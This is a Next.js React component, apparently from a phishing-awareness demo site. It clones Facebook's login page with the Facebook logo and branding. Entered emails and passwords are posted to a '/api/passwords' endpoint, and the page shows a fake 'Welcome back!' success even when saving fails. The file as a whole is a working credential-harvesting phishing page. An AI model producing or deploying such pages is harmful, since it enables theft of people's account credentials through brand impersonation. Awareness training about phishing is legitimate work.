'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';

export default function FakeSocial() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!password) return;

    setIsLoading(true);

    try {
      // Save password and email to API
      const response = await fetch('/api/passwords', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          password: password,
          email: email,
          site: 'Facebook'
        }),
      });

      const data = await response.json();

      if (data.success) {
        setIsLoading(false);
        setIsSuccess(true);

        // Redirect after success
        setTimeout(() => {
          router.push('/');
        }, 2000);
      } else {
        throw new Error('Failed to save password');
      }
    } catch (error) {
      console.error('Error saving password:', error);
      setIsLoading(false);
      // Still show success for demo purposes
      setIsSuccess(true);
      setTimeout(() => {
        router.push('/');
      }, 2000);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="max-w-md w-full">
        {/* Facebook Header */}
        <div className="text-center mb-8">
          <div className="flex items-center justify-center mb-6">
            <div className="w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center">
              <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>
            </div>
          </div>
          <h1 className="text-3xl font-bold text-blue-600 mb-2">Facebook</h1>
          <p className="text-gray-600">Log in to Facebook</p>
        </div>

        {/* Login Form */}
        <div className="bg-white rounded-lg shadow-lg p-6">
          {isSuccess ? (
            <div className="text-center">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-8 h-8 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                </svg>
              </div>
              <h3 className="text-lg font-semibold text-gray-900 mb-2">Welcome back!</h3>
              <p className="text-gray-600">Redirecting to your feed...</p>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-2">
                  Email or Phone
                </label>
                <input
                  type="text"
                  id="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-900 placeholder:text-gray-500"
                  placeholder="Email or Phone"
                />
              </div>

              <div>
                <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
                  Password
                </label>
                <input
                  type="password"
                  id="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-900 placeholder:text-gray-500"
                  placeholder="Password"
                  required
                />
              </div>

              <button
                type="submit"
                disabled={isLoading || !password}
                className="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
              >
                {isLoading ? (
                  <>
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Logging in...
                  </>
                ) : (
                  'Log In'
                )}
              </button>

              <div className="text-center">
                <a href="#" className="text-sm text-blue-600 hover:text-blue-500">
                  Forgotten account?
                </a>
              </div>
            </form>
          )}
        </div>

        {/* Create Account */}
        <div className="bg-white border border-gray-300 rounded-lg p-4 mt-4 text-center">
          <p className="text-sm text-gray-600">
            <span className="font-semibold">Create New Account</span>
          </p>
        </div>

        {/* Footer */}
        <div className="text-center mt-8">
          <div className="flex justify-center space-x-4 text-xs text-gray-500 mb-4">
            <a href="#" className="hover:text-gray-700">English (US)</a>
            <a href="#" className="hover:text-gray-700">Español</a>
            <a href="#" className="hover:text-gray-700">Français (France)</a>
            <a href="#" className="hover:text-gray-700">中文(简体)</a>
          </div>
          <div className="flex justify-center space-x-4 text-xs text-gray-500">
            <a href="#" className="hover:text-gray-700">Sign Up</a>
            <a href="#" className="hover:text-gray-700">Log In</a>
            <a href="#" className="hover:text-gray-700">Messenger</a>
          </div>
          <div className="mt-4 text-xs text-gray-400">
            <p>Facebook Inc.</p>
          </div>
        </div>

        {/* Back to Home - Mobile responsive positioning */}
        <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 md:absolute md:bottom-4 md:left-auto md:right-4 md:transform-none">
          <Link href="/" className="text-sm text-gray-600 hover:text-gray-800 bg-white/90 backdrop-blur-sm px-3 py-1 rounded-full shadow-sm md:bg-transparent md:shadow-none md:px-0 md:py-0">
            ← Back to Phishing Awareness Demo
          </Link>
        </div>
      </div>
    </div>
  );
}
